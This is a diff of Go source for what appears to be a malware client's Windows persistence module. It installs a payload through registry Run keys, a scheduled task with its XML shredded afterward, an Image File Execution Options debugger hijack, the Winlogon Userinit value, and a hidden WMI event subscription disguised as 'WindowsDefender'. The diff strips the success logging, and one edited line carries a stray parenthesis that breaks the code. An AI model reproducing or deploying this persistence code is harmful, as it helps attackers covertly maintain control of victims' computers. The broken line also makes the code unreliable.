@@ -2,9 +2,7 @@ package client
 
 import (
 	"errors"
-	"fmt"
 	"io/ioutil"
-	"log"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -77,7 +75,6 @@ func hkcu(path string) error {
 	if err != nil {
 		return err
 	}
-	log.Println("hkcu success")
 	return nil
 }
 
@@ -100,7 +97,6 @@ func hklm(path string) error {
 	if err != nil {
 		return err
 	}
-	log.Println("hklm success")
 	return nil
 }
 
@@ -123,7 +119,6 @@ func schtasks(path string) error {
 
 	time.Sleep(5 * time.Second)
 	shred.Conf{1, true, true}.File(tempxml)
-	log.Println("schtask success")
 	return nil
 }
 
@@ -155,7 +150,6 @@ func ifeo(path string) error {
 	if err := access.SetStringValue("Debugger", path); err != nil {
 		return err
 	}
-	log.Println("ifeo success")
 	return nil
 }
 
@@ -170,21 +164,17 @@ func userinit(path string) error {
 		return err
 	}
 	defer key.Close()
-	err = key.SetStringValue("Userinit", fmt.Sprintf("%s\\System32\\userinit.exe, %s", os.Getenv("SYSTEMROOT"), path))
+	err = key.SetStringValue("Userinit", os.Getenv("SYSTEMROOT") + "\\System32\\userinit.exe, " + path))
 	if err != nil {
 		return err
 	}
-	log.Println("userinit success")
 	return nil
 }
 
 // wmic admin
 func wmic(path string) error {
-	cmd := exec.Command("cmd", "/C",
-		fmt.Sprintf(
-			"wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='GuacBypassFilter', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''",
-		),
-	)
+	command := `wmic /namespace:'\\root\subscription' PATH __EventFilter CREATE Name='GuacBypassFilter', EventNameSpace='root\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''`
+	cmd := exec.Command("cmd", "/C", command)
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	_, err := cmd.Output()
 	if err != nil {
@@ -193,13 +183,8 @@ func wmic(path string) error {
 
 	time.Sleep(5 * time.Second)
 
-	cmd = exec.Command("cmd", "/C",
-		fmt.Sprintf(
-			"wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='WindowsDefender', ExecutablePath='%s',CommandLineTemplate='%s'",
-			path,
-			path,
-		),
-	)
+	cmd = exec.Command("cmd", "/C", "wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='WindowsDefender', ExecutablePath='"+path+"',CommandLineTemplate='"+path+"'")
+
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	_, err = cmd.Output()
 	if err != nil {
@@ -213,6 +198,5 @@ func wmic(path string) error {
 	if err != nil {
 		return err
 	}
-	log.Println("wmci success")
 	return nil
 }
